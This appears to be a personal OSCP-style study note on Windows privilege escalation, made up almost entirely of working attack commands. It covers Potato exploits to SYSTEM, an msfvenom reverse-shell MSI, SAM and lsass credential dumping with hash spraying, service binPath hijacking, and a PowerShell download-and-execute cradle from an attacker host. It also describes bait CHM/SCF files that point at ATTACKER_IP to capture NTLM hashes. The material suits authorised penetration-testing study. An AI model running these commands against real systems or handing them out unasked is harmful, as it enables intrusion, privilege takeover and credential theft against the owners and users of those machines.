---
tags: [methodology, windows, privesc, oscp]
---

# 03 — Windows Privilege Escalation

> Back to [[00 - Index (MOC)]]. Goal: low-priv user → `NT AUTHORITY\SYSTEM`. Enumerate → match a vector → escalate. If domain-joined, also see [[05 - Active Directory]].

## Enumerate (run these first)
```cmd
whoami /priv          :: **the money shot** — SeImpersonate/SeAssignPrimaryToken/SeBackup/SeRestore/SeDebug/SeLoadDriver
whoami /groups        :: Administrators? Backup Operators? app-pool?
systeminfo            :: OS build/patch → Windows Exploit Suggester
hostname & ipconfig /all
net user & net localgroup administrators
cmdkey /list          :: saved creds → runas /savecred
```
Automate: **winPEAS** (`winPEASx64.exe`), PowerUp (`Invoke-AllChecks`), Seatbelt.
> **Lesson (Flight):** winPEAS download completes but the file vanishes = **Defender quarantined it**. Confirm: `powershell -c "Get-MpThreatDetection | Select -Last 3"`. Use `.bat`/`.ps1` variants, run from memory, or enumerate manually. Details: [[07 - Shells & File Transfers]].

---

## Pick the vector

| Finding                                              | Vector                       | Section           |
| ---------------------------------------------------- | ---------------------------- | ----------------- |
| `SeImpersonate` / `SeAssignPrimaryToken` **Enabled** | **Potato** → SYSTEM          | ↓ Potatoes        |
| `AutoAdminLogon=1` in registry                       | plaintext admin password     | ↓ AutoLogon       |
| `AlwaysInstallElevated=1` (HKLM **and** HKCU)        | malicious MSI                | ↓ MSI             |
| `SeBackup`/`SeRestore`                               | dump SAM/SYSTEM or ntds      | ↓ Backup          |
| `SeDebug` / `SeLoadDriver`                           | token steal / driver         | HackTricks        |
| Unquoted service path + writable dir                 | plant EXE                    | ↓ Services        |
| Weak service perms (`accesschk`)                     | reconfig binPath             | ↓ Services        |
| Writable service binary / DLL hijack                 | replace / plant DLL          | ↓ Services        |
| Scheduled task running as admin, writable script     | overwrite payload            |                   |
| Creds in files / registry                            | reuse everywhere             | ↓ Loot            |
| Old OS, missing patch                                | kernel exploit (last resort) | Exploit Suggester |

---

## SeImpersonate → SYSTEM (Potatoes)
Run from a **stable shell** (webshell > flaky reverse). Output to a file, read it back.
```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\o.txt & icacls C:\Windows\Temp\o.txt /grant Everyone:R"
PrintSpoofer64.exe -c "cmd /c <cmd>"                              :: needs Print Spooler
SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c <cmd>"  :: MS-EFSR — works when others don't
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c <cmd>"                  :: Server 2019+
```
Tool note: [[PrintSpoofer]].

**Potato troubleshooting (all learned the hard way):**
- Match `GodPotato-NET<X>` to installed .NET → `dir C:\Windows\Microsoft.NET\Framework64` (v4.0.30319 → **NET4**).
- Timeout mid-coercion ≠ wrong build → try a **different potato**, run **via the webshell**, or just **retry 3–4×** (they're flaky).
- `-i` (interactive) needs a real console → **fails in a webshell/reverse shell**. Use `-c`/`-cmd` + file redirect.
- **"Access is denied" reading the output file = it WORKED** (file is SYSTEM-owned) → add `icacls ... /grant Everyone:R`.
- Prereq confirm: `whoami /priv` must show `SeImpersonatePrivilege  Enabled` (not just present).

## AutoLogon (plaintext password)
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```
Then reuse → `runas`, [[impacket-psexec]], or [[evil-winrm]].

## AlwaysInstallElevated → MSI
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   :: BOTH must = 1
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

## SeBackup / SeRestore → dump hashes
```cmd
reg save HKLM\SAM C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
```
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL   # → NT hashes → PtH
```
Tool: [[secretsdump.py]].

**Arbitrary file read via `robocopy`** — `SeBackup` alone lets you copy files you'd otherwise be denied, no dumping needed:
```cmd
robocopy /b C:\Users\Administrator\Desktop\ C:\Loot\
```
Fails only on **EFS-encrypted** files (`Access is denied` even with `/b`) — that needs a full Administrator-context logon to decrypt, not just the backup privilege. See gotcha below.

**Domain controller (`ntds.dit`) + PtH context gotcha:** full wbadmin/diskshadow procedure and the psexec-vs-wmiexec Administrator-context trap live in [[05 - Active Directory]] under *Backup Operators → remote NTDS.dit dump* — same privilege, bigger blast radius when the box is a DC.

## Service misconfigurations
```cmd
accesschk.exe -uwcqv "Authenticated Users" *          :: writable services
sc qc <service>                                        :: check binPath / unquoted
:: reconfig if writable:
sc config <service> binPath= "C:\Windows\Temp\rev.exe" & sc stop <svc> & sc start <svc>
```
Unquoted path: plant `C:\Program.exe` or `C:\Program Files\Sub\Program.exe` in a writable gap.

## Installed programs → known CVEs

```cmd
REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
wmic product get name,version
```

Match installed software + version against `searchsploit` and Google. Third-party services often run as SYSTEM with weak permissions.

## Credential loot
```cmd
findstr /si password *.txt *.ini *.config *.xml
dir /s *pass* == *.config == *.kdbx == unattend.xml == Groups.xml
cmdkey /list                          :: → runas /savecred /user:admin cmd
```
KeePass → [[Keepass2]]. Then **reuse creds everywhere** (SMB/WinRM/RDP/MSSQL).

**PowerShell history + transcripts (goldmine — often missed by winPEAS):**
```powershell
(Get-PSReadlineOption).HistorySavePath          :: → ...\PSReadLine\ConsoleHost_history.txt
type <that path>                                 :: Clear-History does NOT wipe this
type C:\Users\Public\Transcripts\*               :: transcripts leak plaintext ConvertTo-SecureString creds
```
`Clear-History` only clears the in-session `Get-History`, never the PSReadline file — admins think they cleaned up. Transcripts record the commands that build `$cred` (user + plaintext password) that the history file omits.

**Found a `.dmp`/`.zip` of lsass instead of dumping it yourself** (loot shares, forensic/audit dumps, backups) — parse offline with **pypykatz**, no live Mimikatz needed:
```bash
pypykatz lsa minidump lsass.DMP                                     # NT hashes per logged-on user
pypykatz lsa minidump lsass.DMP | grep 'NT:' | awk '{print $2}' | sort -u > hashes
pypykatz lsa minidump lsass.DMP | grep 'Username:' | awk '{print $2}' | sort -u > users
nxc smb $IP -u users -H hashes                                      # hash-spray → [[06 - Password Attacks]]
```

---

## Lateral movement (user → user, non-interactive)
`runas` needs an interactive prompt — from a shell use **RunasCs**:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/Invoke-RunasCs.ps1')
Invoke-RunasCs <user> '<pass>' cmd.exe -Remote LHOST:LPORT      :: -Remote, NOT -r (ambiguous!)
```
> **Lesson (Flight):** `Invoke-RunasCs` uses `CreateProcessWithLogonW` (logon type 2) → works even when the user has **no WinRM rights**. And `-r` errors as ambiguous (`-Remote` vs `-RemoteImpersonation`) — spell out `-Remote`.

Pass-the-Hash: `evil-winrm -i $IP -u user -H <NThash>` · `impacket-psexec user@$IP -hashes :<hash>`

**No interactive shell yet — only web RCE?** Verify a found password against a local user and get code exec as them in one shot, no new network session needed, via a PowerShell credential object targeted at `LOCALHOST`:
```powershell
$password = ConvertTo-SecureString -AsPlainText -Force -String '<password>'
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "HOSTNAME\user", $password
Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -Credential $credential
```
`whoami` returning the target user confirms password reuse; swap the ScriptBlock for a download-and-exec `nc.exe` one-liner to get a real shell as them. Useful straight out of an LFI/RCE webshell where you can only fire one-off commands.

---

## Coerce a privileged NTLM auth → capture with Responder (bait files)
If a privileged user (admin, helpdesk) is known to open certain file types from a folder you can write to, plant a file that forces an outbound SMB auth attempt to your box when opened — captures their NetNTLMv2 hash without any traversal/RCE on their session.

**CHM (Compiled HTML Help) — common when a note/CEO-mail references "drop docs here":**
1. Write an `.html` with a UNC-path `<img>`:
```html
<html><body><img src=\\ATTACKER_IP\share\x.png /></body></html>
```
2. Compile it into `.chm` using **HTML Help Workshop** (`htmlhelp.exe`, Windows GUI tool) — File → New → Project → include the HTML file → Compile.
3. Drop the `.chm` into the location the privileged user is known to check (e.g. a `Docs\` folder referenced in a note).
4. `python Responder.py -I tun0` on your box, wait for them to open it → NetNTLMv2 hash lands in Responder's output.
5. `hashcat -m 5600 hash.txt rockyou.txt` → [[06 - Password Attacks]].

Same coercion family, same Responder capture, different bait/trigger: **`.lnk`**, **`.scf`** (icon path forces SMB lookup, no open needed — just Explorer rendering the folder), **`.url`** (`[InternetShortcut] URL=\\attacker\share\`). Try the cheapest one (`.scf`) before building a CHM.

---

## References
- HackTricks Windows privesc: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- lolbas: https://lolbas-project.github.io/
- GodPotato: https://github.com/BeichenDream/GodPotato · PrintSpoofer: https://github.com/itm4n/PrintSpoofer
